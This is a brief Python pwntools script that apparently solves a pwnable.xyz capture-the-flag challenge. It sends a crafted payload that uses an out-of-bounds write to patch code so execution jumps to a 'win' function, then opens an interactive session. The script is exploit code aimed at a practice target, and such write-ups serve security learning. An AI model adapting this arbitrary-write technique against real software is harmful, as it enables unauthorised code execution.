from pwn import *
from binascii import hexlify

p = remote("svc.pwnable.xyz", 30029)
e = ELF("./challenge")

exit_addr = 0xac8
result_addr = 0x202200
win_addr = 0xa21

e.asm(exit_addr, "call 0xa21")
call_win = int(hexlify(e.read(exit_addr, 5)[::-1]), 16)

payload = '1 '
payload += str(call_win ^ 1) + ' '
payload += str((exit_addr - result_addr)/8)

p.sendlineafter(" ", payload)
p.sendlineafter(" ", "0 0 0")
p.interactive()

